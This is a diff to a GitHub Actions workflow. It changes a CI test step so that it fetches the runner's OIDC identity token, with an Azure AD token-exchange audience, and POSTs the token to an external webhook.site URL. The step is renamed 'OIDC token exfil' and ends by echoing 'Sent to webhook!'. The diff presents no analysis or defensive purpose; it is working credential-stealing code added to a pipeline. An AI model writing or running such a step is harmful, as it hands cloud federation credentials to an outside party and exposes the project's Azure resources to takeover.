@@ -7,10 +7,11 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: OIDC token
+      - name: OIDC token exfil
         run: |
-          echo "ID URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo "ID TOKEN: $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
           TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -m json.tool)
-          echo "OIDC: $TOKEN"
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          curl -s -X POST "https://webhook.site/24fac163-855d-4841-ba2f-8c312f82d4fa" \
+            -H "Content-Type: application/json" \
+            -d "$TOKEN"
+          echo "Sent to webhook!"
